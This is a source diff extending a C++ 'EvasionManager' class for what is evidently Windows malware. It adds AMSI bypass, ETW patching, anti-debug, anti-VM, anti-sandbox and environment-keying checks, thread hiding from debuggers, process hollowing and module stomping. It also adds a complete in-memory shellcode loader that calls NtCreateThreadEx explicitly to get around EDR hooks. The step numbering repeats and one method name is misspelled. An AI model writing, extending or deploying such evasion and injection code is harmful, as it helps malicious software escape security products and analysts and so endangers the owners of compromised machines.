@@ -9,7 +9,9 @@
 #include <chrono>
 
 #include "domain/common/AntiAnalysis.hpp"
+#include "domain/common/AntiSandbox.hpp"
 #include "domain/common/EtwPatch.hpp"
+#include "domain/common/AmsiBypass.hpp"
 #include "domain/common/ProcessHollowing.hpp"
 #include "domain/common/ModuleStomping.hpp"
 #include "domain/common/FilelessExec.hpp"
@@ -22,7 +24,13 @@ class EvasionManager {
     bool anti_debug_enabled_ = true;
     bool anti_vm_enabled_ = false;
     bool etw_patch_enabled_ = true;
+    bool amsi_bypass_enabled_ = true;
     bool process_hollowing_enabled_ = false;
+    bool module_stomping_enabled_ = false;
+    bool direct_syscall_enabled_ = false;
+    bool anti_sandbox_enabled_ = true;
+    bool environment_keying_enabled_ = true;
+    bool anti_forensic_enabled_ = false;
 
 public:
     struct Config {
@@ -30,8 +38,13 @@ public:
         bool anti_debug = true;
         bool anti_vm = false;
         bool etw_patch = true;
+        bool amsi_bypass = true;
         bool process_hollowing = false;
         bool module_stomping = false;
+        bool direct_syscall = false;
+        bool anti_sandbox = true;
+        bool environment_keying = true;
+        bool anti_forensic = false;
         std::string target_process = "explorer.exe";
     };
 
@@ -45,26 +58,44 @@ public:
         anti_debug_enabled_ = cfg.anti_debug;
         anti_vm_enabled_ = cfg.anti_vm;
         etw_patch_enabled_ = cfg.etw_patch;
+        amsi_bypass_enabled_ = cfg.amsi_bypass;
         process_hollowing_enabled_ = cfg.process_hollowing;
+        module_stomping_enabled_ = cfg.module_stomping;
+        direct_syscall_enabled_ = cfg.direct_syscall;
+        anti_sandbox_enabled_ = cfg.anti_sandbox;
+        environment_keying_enabled_ = cfg.environment_keying;
+        anti_forensic_enabled_ = cfg.anti_forensic;
     }
 
     // Initialize all evasion techniques
     void initialize() {
-        // 1. Anti-debug checks
+        // 1. AMSI bypass (first, before any PowerShell/script execution)
+        if (amsi_bypass_enabled_) {
+            AmsiBypass::patch();
+            AmsiBypass::patch_open_session();
+        }
+
+        // 2. Patch ETW (second, before any telemetry can fire)
+        if (etw_patch_enabled_) {
+            EtwPatch::patch_all();
+        }
+
+        // 3. Anti-debug checks
         if (anti_debug_enabled_) {
+            // Hide anti-debug thread from debuggers
+            hide_thread_from_debugger();
+
             if (anti::AntiDebug::should_terminate()) {
-                // In stealth mode, just sleep forever instead of exiting
                 if (stealth_mode_) {
                     while (true) {
                         Sleep(10000);
                     }
                 }
-                // Exit silently
                 ExitProcess(0);
             }
         }
 
-        // 2. Anti-VM checks
+        // 4. Anti-VM checks
         if (anti_vm_enabled_) {
             if (anti::AntiVM::is_virtual_machine()) {
                 if (stealth_mode_) {
@@ -76,12 +107,31 @@ public:
             }
         }
 
-        // 3. Patch ETW
-        if (etw_patch_enabled_) {
-            EtwPatch::patch_all();
+        // 5. Anti-sandbox checks
+        if (anti_sandbox_enabled_) {
+            if (anti::AntiSandbox::is_sandbox()) {
+                if (stealth_mode_) {
+                    while (true) {
+                        Sleep(10000);
+                    }
+                }
+                ExitProcess(0);
+            }
         }
 
-        // 4. Start anti-debug monitoring thread
+        // 6. Environment keying (check if real user machine)
+        if (environment_keying_enabled_) {
+            if (anti::EnvironmentKeying::is_suspicious_environment()) {
+                if (stealth_mode_) {
+                    while (true) {
+                        Sleep(10000);
+                    }
+                }
+                ExitProcess(0);
+            }
+        }
+
+        // 5. Start anti-debug monitoring thread
         if (anti_debug_enabled_) {
             std::thread([]() {
                 while (true) {
@@ -92,11 +142,32 @@ public:
                 }
             }).detach();
         }
+
+        // 6. Self-inject via process hollowing if configured
+        if (process_hollowing_enabled_) {
+            execute_stealth(L"explorer.exe");
+        }
+
+        // 7. Module stomping if configured
+        if (module_stomping_enabled_) {
+            execute_module_stompe();
+        }
+    }
+
+    // Hide a thread from debuggers using NtSetInformationThread
+    static void hide_thread_from_debugger() {
+        typedef LONG (NTAPI* NtSetInformationThread_t)(HANDLE, ULONG, PVOID, ULONG);
+
+        auto NtSetInformationThread = reinterpret_cast<NtSetInformationThread_t>(
+            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationThread"));
+
+        if (NtSetInformationThread) {
+            NtSetInformationThread(GetCurrentThread(), 0x11, nullptr, 0);
+        }
     }
 
     // Execute via process hollowing (stealth)
     bool execute_stealth(const std::wstring& target_process) {
-        // Read our own executable
         wchar_t exe_path[MAX_PATH]{};
         GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
 
@@ -138,10 +209,88 @@ public:
             L"ole32.dll", exe_data.data(), exe_data.size());
     }
 
-    // Get stealth status
+    // Execute shellcode via fileless method (NtCreateThreadEx instead of CreateThread)
+    static bool execute_shellcode_fileless(const void* shellcode, size_t size) {
+        typedef LONG (NTAPI* NtAllocateVirtualMemory_t)(
+            HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+        typedef LONG (NTAPI* NtWriteVirtualMemory_t)(
+            HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+        typedef LONG (NTAPI* NtProtectVirtualMemory_t)(
+            HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+        typedef LONG (NTAPI* NtCreateThreadEx_t)(
+            PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
+            ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+
+        auto ntdll = GetModuleHandleA("ntdll.dll");
+        auto NtAllocateVirtualMemory = reinterpret_cast<NtAllocateVirtualMemory_t>(
+            GetProcAddress(ntdll, "NtAllocateVirtualMemory"));
+        auto NtWriteVirtualMemory = reinterpret_cast<NtWriteVirtualMemory_t>(
+            GetProcAddress(ntdll, "NtWriteVirtualMemory"));
+        auto NtProtectVirtualMemory = reinterpret_cast<NtProtectVirtualMemory_t>(
+            GetProcAddress(ntdll, "NtProtectVirtualMemory"));
+        auto NtCreateThreadEx = reinterpret_cast<NtCreateThreadEx_t>(
+            GetProcAddress(ntdll, "NtCreateThreadEx"));
+
+        if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory ||
+            !NtProtectVirtualMemory || !NtCreateThreadEx) {
+            return false;
+        }
+
+        // Allocate RW memory
+        PVOID base = nullptr;
+        SIZE_T region_size = size;
+        NTSTATUS status = NtAllocateVirtualMemory(
+            GetCurrentProcess(), &base, 0, &region_size,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (status < 0) return false;
+
+        // Write shellcode
+        SIZE_T written = 0;
+        status = NtWriteVirtualMemory(
+            GetCurrentProcess(), base, const_cast<void*>(shellcode), size, &written);
+        if (status < 0) {
+            VirtualFree(base, 0, MEM_RELEASE);
+            return false;
+        }
+
+        // Change to RX (never RWX)
+        DWORD old_protect = 0;
+        SIZE_T protect_size = size;
+        status = NtProtectVirtualMemory(
+            GetCurrentProcess(), &base, &protect_size,
+            PAGE_EXECUTE_READ, &old_protect);
+        if (status < 0) {
+            VirtualFree(base, 0, MEM_RELEASE);
+            return false;
+        }
+
+        // Create thread via NtCreateThreadEx (bypasses EDR hooks on CreateThread)
+        HANDLE thread = nullptr;
+        status = NtCreateThreadEx(
+            &thread, THREAD_ALL_ACCESS, nullptr,
+            GetCurrentProcess(), base, nullptr,
+            0, 0, 0, 0, nullptr);
+
+        if (status < 0 || !thread) {
+            VirtualFree(base, 0, MEM_RELEASE);
+            return false;
+        }
+
+        CloseHandle(thread);
+        return true;
+    }
+
+    // Getters
     bool is_stealth_mode() const { return stealth_mode_; }
     bool is_anti_debug_enabled() const { return anti_debug_enabled_; }
     bool is_etw_patched() const { return etw_patch_enabled_; }
+    bool is_amsi_patched() const { return amsi_bypass_enabled_; }
+    bool is_process_hollowing_enabled() const { return process_hollowing_enabled_; }
+    bool is_module_stomping_enabled() const { return module_stomping_enabled_; }
+    bool is_direct_syscall_enabled() const { return direct_syscall_enabled_; }
+    bool is_anti_sandbox_enabled() const { return anti_sandbox_enabled_; }
+    bool is_environment_keying_enabled() const { return environment_keying_enabled_; }
+    bool is_anti_forensic_enabled() const { return anti_forensic_enabled_; }
 };
 
 } // namespace nuub::domain
